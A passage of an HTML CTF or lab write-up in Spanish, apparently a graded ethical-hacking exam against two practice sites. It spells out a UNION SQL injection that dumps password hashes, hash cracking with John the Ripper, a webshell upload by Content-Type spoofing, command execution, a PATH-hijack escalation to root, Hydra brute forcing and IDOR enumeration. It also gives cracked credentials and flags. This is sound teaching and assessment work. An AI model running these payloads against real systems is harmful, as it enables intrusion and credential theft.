                La consulta SQL subyacente (<code class="bg-amber-100 dark:bg-amber-900 px-1 py-0.5 rounded">SELECT * FROM products WHERE name LIKE '%<INPUT>%' OR description LIKE '%<INPUT>%'</code>) fue alterada lógicamente. Al evaluar <code>'1'='1</code>, la cláusula WHERE se cumple para cada fila en la base de datos SQLite, demostrando la ausencia de sentencias preparadas.
              </p>
            </div>
          </article>

          <!-- FASE 3: UNION SQLI EXFILTRACIÓN -->
          <article id="s1-fase3" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 3</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 3 — Exfiltración de Credenciales vía UNION-based SQLi</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              Mediante la técnica <code>ORDER BY 8</code> se constató que la consulta original proyecta exactamente 8 columnas. La columna 2 se proyecta como título de la tarjeta y la columna 3 como descripción. Se construyó una sentencia <code>UNION SELECT</code> hacia la tabla interna <code>users</code> para volcar los nombres de usuario y hashes.
            </p>

            <div class="rounded-xl overflow-hidden bg-slate-900 text-slate-100 font-mono text-xs border border-slate-800">
              <div class="flex items-center justify-between px-4 py-2 bg-slate-800/80 border-b border-slate-700/60">
                <span class="text-slate-400 font-bold">PAYLOAD DE EXFILTRACIÓN UNION</span>
                <button onclick="copyCode(this)" class="flex items-center gap-1 text-slate-400 hover:text-white transition-colors">
                  <span class="material-symbols-outlined text-[14px]">content_copy</span>
                  <span>Copiar</span>
                </button>
              </div>
              <pre class="p-4 overflow-x-auto text-[13px] leading-relaxed"><code>http://134.209.63.29/search?q=' UNION SELECT 1,username,password,role,5,6,7,8 FROM users--</code></pre>
            </div>

            <div class="space-y-1.5">
              <img src="assets/images/s1_sqli_union_exfiltration.jpg" alt="Exfiltración de credenciales" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'UNION SQLi: Extracción de cuentas y hashes en tarjetas de productos')"/>
              <p class="text-[11px] text-surface-muted text-center italic">Evidencia 3.1: Visualización del usuario administrator, rol admin y hash MD5</p>
            </div>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border space-y-2 text-xs font-mono">
              <span class="font-bold text-surface-text uppercase tracking-wider block">Credenciales Extraídas del Administrador:</span>
              <div class="flex flex-col gap-1 text-surface-muted">
                <div><span class="text-brand-600 font-bold">Usuario:</span> administrator</div>
                <div><span class="text-brand-600 font-bold">Rol:</span> admin</div>
                <div class="flex items-center gap-2">
                  <span class="text-brand-600 font-bold">Hash MD5:</span>
                  <span class="px-2 py-0.5 rounded bg-surface-card border border-surface-border font-bold text-surface-text select-all">2071505695be4270226ebc5d38a0ab1d</span>
                </div>
              </div>
            </div>
          </article>

          <!-- FASE 4: CRACKING MD5 -->
          <article id="s1-fase4" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 4</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 4 — Criptoanálisis & Cracking con John the Ripper</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              El hash obtenido consta de 32 dígitos hexadecimales (128 bits) sin prefijo de sal, coincidiendo con el algoritmo obsoleto <strong>MD5 (raw-md5)</strong>. Debido a que las máquinas virtuales carecen por defecto de soporte GPU OpenCL para Hashcat, se empleó <strong>John the Ripper</strong> sobre CPU con el diccionario provisto <code>challenge-wordlist.txt</code>.
            </p>

            <div class="rounded-xl overflow-hidden bg-slate-900 text-slate-100 font-mono text-xs border border-slate-800">
              <div class="flex items-center justify-between px-4 py-2 bg-slate-800/80 border-b border-slate-700/60">
                <span class="text-slate-400 font-bold">COMANDO JOHN THE RIPPER</span>
                <button onclick="copyCode(this)" class="flex items-center gap-1 text-slate-400 hover:text-white transition-colors">
                  <span class="material-symbols-outlined text-[14px]">content_copy</span>
                  <span>Copiar</span>
                </button>
              </div>
              <pre class="p-4 overflow-x-auto text-[13px] leading-relaxed"><code>john --format=raw-md5 --wordlist=challenge-wordlist.txt hash.txt
john --show --format=raw-md5 hash.txt</code></pre>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              <div class="space-y-1.5">
                <img src="assets/images/s1_hash_mousepad.png" alt="Hash en editor" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Archivo hash.txt con la cadena extraída')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 4.1: Preparación del archivo hash.txt en Mousepad</p>
              </div>
              <div class="space-y-1.5">
                <img src="assets/images/s1_john_cracking.png" alt="John output" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'John the Ripper: Contraseña recuperada GlacierRun42')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 4.2: Ejecución exitosa de John mostrando ?:GlacierRun42</p>
              </div>
            </div>

            <div class="p-4 rounded-xl bg-emerald-50 dark:bg-emerald-950/30 border border-emerald-200 dark:border-emerald-800 text-xs text-emerald-900 dark:text-emerald-200 flex items-center justify-between">
              <div>
                <span class="font-bold font-mono uppercase tracking-wider block">Contraseña en Texto Plano Recuperada:</span>
                <span class="text-base font-bold font-mono">GlacierRun42</span>
              </div>
              <span class="px-2 py-1 rounded bg-emerald-100 dark:bg-emerald-900 font-mono font-bold">A02 Broken Crypto</span>
            </div>
          </article>

          <!-- FASE 5: FILE UPLOAD CONTENT-TYPE BYPASS -->
          <article id="s1-fase5" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 5</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 5 — Evasión de Restricciones en Carga de Archivos (MIME Bypass)</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              Tras iniciar sesión en <code>/login</code> con las credenciales <code>administrator / GlacierRun42</code>, se accedió al módulo restringido <code>/admin/documents</code>. Aunque el formulario indica permitir únicamente documentos PDF, el backend evalúa únicamente la cabecera HTTP <code>Content-Type</code> enviada por el cliente, permitiendo cargar scripts PHP si se declara fraudulentamente como <code>application/pdf</code>.
            </p>

            <div class="rounded-xl overflow-hidden bg-slate-900 text-slate-100 font-mono text-xs border border-slate-800">
              <div class="flex items-center justify-between px-4 py-2 bg-slate-800/80 border-b border-slate-700/60">
                <span class="text-slate-400 font-bold">SUBIDA DE WEBSHELL CON CURL & CONTENT-TYPE FORZADO</span>
                <button onclick="copyCode(this)" class="flex items-center gap-1 text-slate-400 hover:text-white transition-colors">
                  <span class="material-symbols-outlined text-[14px]">content_copy</span>
                  <span>Copiar</span>
                </button>
              </div>
              <pre class="p-4 overflow-x-auto text-[13px] leading-relaxed"><code>curl -b "session=.eJyrVirKz0lvslJKTMnNzFPSUSotTi2Kz0xRsjKEsPMSc-HSmcUlRYkl-UVKtQABXRML.aqtMng.lPadHBr9CwgKY5RVBANuIgnv04E" \
     -F "file=@shell.php;type=application/pdf" \
     http://134.209.63.29/admin/documents</code></pre>
            </div>

            <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 pt-2">
              <div class="space-y-1.5">
                <img src="assets/images/s1_cookie_inspector.png" alt="Cookie de sesión" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Extracción de cookie en Storage del navegador')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 5.1: Extracción de sesión de admin</p>
              </div>
              <div class="space-y-1.5">
                <img src="assets/images/s1_curl_upload.png" alt="cURL upload" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Ejecución de cURL con redirección HTTP exitosa')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 5.2: Respuesta 302 de cURL</p>
              </div>
              <div class="space-y-1.5">
                <img src="assets/images/s1_admin_documents.png" alt="Admin docs panel" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Panel /admin/documents con shell.php cargado')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 5.3: shell.php listado con botón View</p>
              </div>
            </div>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border space-y-2 text-xs">
              <span class="font-bold text-surface-text uppercase font-mono tracking-wider">Causa Raíz del Fallo:</span>
              <p class="text-surface-muted leading-relaxed">
                El backend confía ciegamente en la cabecera <code>Content-Type: application/pdf</code> reportada por el cliente. No valida la extensión <code>.php</code> contra una lista blanca en el servidor, no verifica firmas binarias (<em>Magic Bytes</em> <code>%PDF-</code>) ni deshabilita la ejecución de scripts dentro de la carpeta pública <code>uploads/</code>.
              </p>
            </div>
          </article>

          <!-- FASE 6: RCE & FLAG 1 -->
          <article id="s1-fase6" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 6</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 6 — RCE, Post-Explotación & Captura de FLAG 1</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              Al hacer clic en "View" sobre el archivo cargado, se reveló la ruta de almacenamiento con nombre ofuscado en Base64 con token. A través del parámetro <code>?cmd=</code> se ejecutaron comandos interactivos del sistema operativo como el usuario de servicio <code>www-data</code>.
            </p>

            <div class="rounded-xl overflow-hidden bg-slate-900 text-slate-100 font-mono text-xs border border-slate-800">
              <div class="flex items-center justify-between px-4 py-2 bg-slate-800/80 border-b border-slate-700/60">
                <span class="text-slate-400 font-bold">LECTURA DE FLAG 1 VIA WEBSHELL</span>
                <button onclick="copyCode(this)" class="flex items-center gap-1 text-slate-400 hover:text-white transition-colors">
                  <span class="material-symbols-outlined text-[14px]">content_copy</span>
                  <span>Copiar</span>
                </button>
              </div>
              <pre class="p-4 overflow-x-auto text-[13px] leading-relaxed"><code>http://134.209.63.29/uploads/c2hlbGcwucGhwOjEwZWZkNWkZTkxM2ZmNTM4ZGFinZM3OTQ2ZQ.php?cmd=cat+/var/www/technova/flag1.txt</code></pre>
            </div>

            <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-2">
              <img src="assets/images/s1_webshell_id.png" alt="id" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Comando id: uid=33(www-data) gid=33(www-data)')"/>
              <img src="assets/images/s1_webshell_whoami.png" alt="whoami" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Comando whoami: www-data')"/>
              <img src="assets/images/s1_webshell_ls.png" alt="ls" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Comando ls /var/www/technova/ listando flag1.txt')"/>
              <img src="assets/images/s1_webshell_flag1.png" alt="flag1" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Lectura del contenido de FLAG 1')"/>
            </div>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border text-xs font-mono space-y-1.5">
              <div class="flex items-center justify-between">
                <span class="text-surface-muted font-bold">FLAG 1 Recuperada:</span>
                <span class="text-emerald-600 font-bold">Status: Verificada</span>
              </div>
              <div class="p-2.5 rounded-lg bg-surface-card border border-surface-border font-bold text-sm text-brand-600 dark:text-brand-400 select-all">
                FLAG{6e2c3a325feda8c8283908fba329969}
              </div>
              <span class="text-[11px] text-surface-muted block">Ruta: /var/www/technova/flag1.txt</span>
            </div>
          </article>

          <!-- FASE 7: SUID & PATH HIJACKING -->
          <article id="s1-fase7" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 7</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 7 — Escalada de Privilegios Local: SUID & PATH Hijacking (FLAG 2)</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              Se ejecutó una enumeración de binarios con el bit SUID activo en el servidor remoto (<code class="font-mono text-xs">find / -perm -4000 2>/dev/null</code>), identificando el binario anómalo <code>/usr/local/bin/netdiag</code> perteneciente al superusuario root.
            </p>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border space-y-2 text-xs">
              <span class="font-bold text-surface-text uppercase font-mono tracking-wider">Mecanismo de la Vulnerabilidad:</span>
              <p class="text-surface-muted leading-relaxed">
                El programa compilado <code>netdiag</code> ejecuta el comando de red <code>ifconfig</code> mediante una llamada relativa (sin especificar <code>/sbin/ifconfig</code>). Al ejecutar llamadas relativas, el sistema operativo busca el comando secuencialmente de izquierda a derecha en las rutas definidas en la variable de entorno <code>$PATH</code>.
              </p>
            </div>

            <!-- Steps Code Box -->
            <div class="rounded-xl overflow-hidden bg-slate-900 text-slate-100 font-mono text-xs border border-slate-800">
              <div class="flex items-center justify-between px-4 py-2 bg-slate-800/80 border-b border-slate-700/60">
                <span class="text-slate-400 font-bold">SECUENCIA DE COMANDOS: PATH HIJACKING A ROOT</span>
                <button onclick="copyCode(this)" class="flex items-center gap-1 text-slate-400 hover:text-white transition-colors">
                  <span class="material-symbols-outlined text-[14px]">content_copy</span>
                  <span>Copiar</span>
                </button>
              </div>
              <pre class="p-4 overflow-x-auto text-[13px] leading-relaxed"><code># 1. Crear script interceptor en directorio temporal
mkdir -p /tmp/.priv
echo '/bin/bash -p' > /tmp/.priv/ifconfig
chmod +x /tmp/.priv/ifconfig

# 2. Anteponer el directorio malicioso en el PATH
export PATH=/tmp/.priv:$PATH

# 3. Invocar el binario SUID (ejecuta el script falso como root)
/usr/local/bin/netdiag

# 4. Leer la flag en el directorio protegido
cat /var/www/technova/.private/flag2.txt</code></pre>
            </div>

            <!-- Evidence Images -->
            <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 pt-2">
              <img src="assets/images/s1_suid_find.png" alt="Find SUID" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Búsqueda de binarios SUID en el servidor')"/>
              <img src="assets/images/s1_path_hijack_echo.png" alt="Echo ifconfig" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Inyección del script falso ifconfig')"/>
              <img src="assets/images/s1_path_hijack_netdiag.png" alt="Netdiag execution" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Invocación de netdiag activando privilegios root')"/>
              <img src="assets/images/s1_webshell_flag2.png" alt="Flag 2 read" class="w-full rounded-lg border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Lectura de FLAG 2 en directorio .private')"/>
            </div>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border text-xs font-mono space-y-1.5">
              <div class="flex items-center justify-between">
                <span class="text-surface-muted font-bold">FLAG 2 Recuperada (Root Compromise):</span>
                <span class="text-rose-600 font-bold">Privilegios Máximos</span>
              </div>
              <div class="p-2.5 rounded-lg bg-surface-card border border-surface-border font-bold text-sm text-rose-600 dark:text-rose-400 select-all">
                FLAG{53dbcc8c5acc828c0ae1e085e575f25d}
              </div>
              <span class="text-[11px] text-surface-muted block">Ruta: /var/www/technova/.private/flag2.txt</span>
            </div>
          </article>
        </section>

        <!-- ================= SECTION 02: LARM182 SOLUTIONS ================= -->
        <section class="space-y-10 pt-4">
          <div class="flex items-center justify-between border-b border-emerald-200 dark:border-emerald-900 pb-3">
            <div class="flex items-center gap-3">
              <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-emerald-50 text-emerald-600 dark:bg-emerald-950 dark:text-emerald-400 font-mono font-bold text-sm">02</span>
              <div>
                <h2 class="text-2xl font-bold tracking-tight text-surface-text">Sitio 2 — Larm182 Solutions</h2>
                <span class="text-xs text-surface-muted font-mono">http://134.209.63.29:8080 · Info Disclosure, Fuerza Bruta, IDOR & HTTP PUT</span>
              </div>
            </div>
            <span class="px-3 py-1 rounded-full text-xs font-mono font-bold bg-emerald-50 text-emerald-700 dark:bg-emerald-950 dark:text-emerald-300 border border-emerald-200 dark:border-emerald-800">30 Puntos (Preguntas 8–13)</span>
          </div>

          <!-- FASE 8: INFO DISCLOSURE -->
          <article id="s2-fase8" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 8</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 8 — Fuga de Información Sensible en phpinfo() (OWASP A05)</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              Durante el reconocimiento de directorios en el puerto 8080 con <code>dirb</code>, se descubrió el archivo de diagnóstico <code>/info.php</code>. Este archivo ejecuta la función nativa <code>phpinfo()</code>, exponiendo de manera irrestricta la arquitectura del servidor, rutas internas y variables de entorno del contenedor Docker.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              <div class="space-y-1.5">
                <img src="assets/images/s2_recon_dirb.png" alt="Dirb scan" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Descubrimiento de info.php con código 200 en dirb')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 8.1: Enumeración con dirb localizando /info.php</p>
              </div>
              <div class="space-y-1.5">
                <img src="assets/images/s2_phpinfo_env.png" alt="phpinfo env" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Sección Environment y PHP Variables exponiendo WORDLIST')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 8.2: Variable WORDLIST en phpinfo revelando /recursos/palabras.txt</p>
              </div>
            </div>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border space-y-2 text-xs font-mono">
              <span class="font-bold text-surface-text uppercase tracking-wider block">Detalles de la Variable Expuesta:</span>
              <div class="space-y-1 text-surface-muted">
                <div><span class="text-brand-600 font-bold">Secciones:</span> Environment y PHP Variables ($_SERVER y $_ENV)</div>
                <div><span class="text-brand-600 font-bold">Nombre de la variable:</span> WORDLIST</div>
                <div><span class="text-brand-600 font-bold">Ruta interna:</span> /recursos/palabras.txt</div>
                <div><span class="text-brand-600 font-bold">Enlace web de descarga:</span> http://134.209.63.29:8080/recursos/palabras.txt</div>
              </div>
            </div>
          </article>

          <!-- FASE 9: FUERZA BRUTA CON HYDRA -->
          <article id="s2-fase9" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 9</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 9 — Ataque de Fuerza Bruta Automatizado con THC-Hydra</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              Se descargó el diccionario expuesto en el servidor guardándolo como <code>lista.txt</code>. Se empleó <strong>THC-Hydra (v9.7)</strong> contra el endpoint de autenticación <code>/envia.php</code> mediante el módulo <code>http-post-form</code>.
            </p>

            <div class="rounded-xl overflow-hidden bg-slate-900 text-slate-100 font-mono text-xs border border-slate-800">
              <div class="flex items-center justify-between px-4 py-2 bg-slate-800/80 border-b border-slate-700/60">
                <span class="text-slate-400 font-bold">COMANDO THC-HYDRA HTTP-POST-FORM</span>
                <button onclick="copyCode(this)" class="flex items-center gap-1 text-slate-400 hover:text-white transition-colors">
                  <span class="material-symbols-outlined text-[14px]">content_copy</span>
                  <span>Copiar</span>
                </button>
              </div>
              <pre class="p-4 overflow-x-auto text-[13px] leading-relaxed"><code>hydra -l admin -P lista.txt -s 8080 134.209.63.29 http-post-form \
  "/envia.php:usuario=^USER^&contrasena=^PASS^&submit=Login:Usuario o contraseña incorrectos." -t 10 -V</code></pre>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              <div class="space-y-1.5">
                <img src="assets/images/s2_hydra_success.png" alt="Hydra éxito" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Hydra: Credencial descubierta admin:s3cur1ty2026')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 9.1: Respuesta afirmativa de Hydra con usuario y clave</p>
              </div>
              <div class="space-y-1.5">
                <img src="assets/images/s2_wordlist_line56.png" alt="Línea 56 Mousepad" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Búsqueda de la contraseña en la línea 56 de lista.txt')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 9.2: Localización exacta en la línea 56 del diccionario</p>
              </div>
            </div>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border text-xs font-mono space-y-1">
              <div class="text-surface-muted"><span class="text-brand-600 font-bold">Usuario autenticado:</span> admin</div>
              <div class="text-surface-muted"><span class="text-brand-600 font-bold">Contraseña encontrada:</span> <span class="font-bold text-surface-text select-all">s3cur1ty2026</span></div>
              <div class="text-surface-muted"><span class="text-brand-600 font-bold">Ubicación:</span> Línea 56 de lista.txt</div>
            </div>
          </article>

          <!-- FASE 10: IDOR EN REPORTES -->
          <article id="s2-fase10" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 10</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 10 — Referencia Directa Insegura a Objetos (IDOR / OWASP A01)</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              Tras autenticarse, el módulo de reportes utiliza un parámetro numérico predecible en la URL (<code>/reportes/ver.php?id=1</code>). El servidor procesa el identificador sin verificar si el usuario tiene relación de propiedad sobre dicho acta. Para determinar cuántos reportes existen en total se automatizó la enumeración con <code>curl</code> y <code>ffuf</code>.
            </p>

            <div class="rounded-xl overflow-hidden bg-slate-900 text-slate-100 font-mono text-xs border border-slate-800">
              <div class="flex items-center justify-between px-4 py-2 bg-slate-800/80 border-b border-slate-700/60">
                <span class="text-slate-400 font-bold">COMANDO CURL DE ENUMERACIÓN SECUENCIAL (1 A 150)</span>
                <button onclick="copyCode(this)" class="flex items-center gap-1 text-slate-400 hover:text-white transition-colors">
                  <span class="material-symbols-outlined text-[14px]">content_copy</span>
                  <span>Copiar</span>
                </button>
              </div>
              <pre class="p-4 overflow-x-auto text-[13px] leading-relaxed"><code>curl -s -b "PHPSESSID=9f4097e1b82577adef7f1e5768dab123" \
     "http://134.209.63.29:8080/reportes/ver.php?id=[1-150]" \
     -w "%{http_code}\n" -o /dev/null | grep -c "^200$"</code></pre>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              <div class="space-y-1.5">
                <img src="assets/images/s2_idor_cookie.png" alt="Reporte 1" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Módulo de reportes y cookie PHPSESSID en el inspector')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 10.1: Visualización del Reporte #1 con sesión activa</p>
              </div>
              <div class="space-y-1.5">
                <img src="assets/images/s2_idor_curl_100.png" alt="Conteo 100" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Salida de cURL confirmando exactamente 100 respuestas 200 OK')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 10.2: Salida de terminal confirmando 100 reportes válidos</p>
              </div>
            </div>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border text-xs space-y-1">
              <div class="font-bold text-surface-text"><span class="text-brand-600 font-mono">Total de reportes existentes:</span> 100 reportes (IDs del 1 al 100).</div>
              <div class="text-surface-muted">A partir del identificador 101, el servidor deja de retornar respuestas 200 OK.</div>
            </div>
          </article>

          <!-- FASE 11: EXFILTRACIÓN EN REPORTE #73 -->
          <article id="s2-fase11" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 11</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 11 — Exfiltración de Credenciales de Respaldo & FLAG Sitio 2</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              Al analizar el tamaño de las respuestas durante el fuzzing con <code>ffuf</code>, se observó que el <strong>Reporte #73</strong> presentó una longitud anómala (Size: 2123 frente a ~1917 de los demás). Al consultar dicho registro se descubrió un acta interna de infraestructura con credenciales SSH.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              <div class="space-y-1.5">
                <img src="assets/images/s2_idor_ffuf_flag.jpg" alt="Ffuf match" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Ffuf filtrando por hacking_etico2026 y detectando id=73')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 11.1: Ffuf localizando la coincidencia en el ID 73</p>
              </div>
              <div class="space-y-1.5">
                <img src="assets/images/s2_idor_report73.png" alt="Reporte 73 completo" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Acta del Reporte #73 con credenciales de acceso')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 11.2: Vista completa del Reporte de Infraestructura #73</p>
              </div>
            </div>

            <div class="p-4 rounded-xl bg-surface-inset border border-surface-border text-xs font-mono space-y-2">
              <span class="font-bold text-surface-text uppercase tracking-wider block">Fragmento Transcrito del Reporte Sensible:</span>
              <pre class="p-3 rounded-lg bg-surface-card border border-surface-border text-surface-text text-[12px] leading-relaxed"><code>CREDENCIALES DE ACCESO:
  Usuario del sistema: hacking_etico2026
  Contrasena de acceso: C0rp0r4t3_B4ckup_2026

NOTA IMPORTANTE:
  El acceso esta restringido exclusivamente al personal del area de
  infraestructura con autorizacion previa de la Gerencia de TI.
  Este documento debe ser eliminado una vez se realice el primer acceso.</code></pre>
              <div class="flex items-center justify-between pt-1">
                <span class="text-surface-muted font-bold">FLAG Sitio 2:</span>
                <span class="text-base font-bold text-emerald-600 dark:text-emerald-400 select-all font-mono">C0rp0r4t3_B4ckup_2026</span>
              </div>
            </div>
          </article>

          <!-- FASE 12: HTTP PUT WEBSHELL UPLOAD -->
          <article id="s2-fase12" class="space-y-4 p-6 rounded-2xl bg-surface-card border border-surface-border shadow-xs">
            <div class="flex flex-wrap items-center justify-between gap-2 border-b border-surface-border pb-3">
              <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded bg-brand-50 text-brand-600 dark:bg-brand-950 dark:text-brand-400 font-mono text-xs font-bold">Fase 12</span>
                <h3 class="text-lg font-bold text-surface-text">Pregunta 12 — Carga de Webshell vía HTTP PUT con Burp Suite</h3>
              </div>
              <span class="text-xs font-mono text-surface-muted font-semibold">Valor: 5 pts</span>
            </div>

            <p class="text-sm text-surface-muted leading-relaxed">
              El endpoint <code>/api/subir.php</code> acepta la carga directa de archivos mediante el verbo <strong>HTTP PUT</strong>. El código del script se transmite directamente en el cuerpo (body) de la solicitud y el nombre se especifica mediante el parámetro <code>?nombre=shellnelson.php</code>. Se utilizó <strong>Burp Suite Repeater</strong> para contrastar el comportamiento con y sin sesión activa.
            </p>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              <div class="space-y-1.5">
                <img src="assets/images/s2_put_repeater_401.png" alt="Burp 401" class="w-full rounded-xl border border-surface-border img-zoom" onclick="openLightbox(this.src, 'Burp Repeater: Petición rechazada con 401 Unauthorized sin cookie')"/>
                <p class="text-[11px] text-surface-muted text-center italic">Evidencia 12.1: Rechazo con código 401 Unauthorized sin sesión</p>
              </div>
              <div class="space-y-1.5">
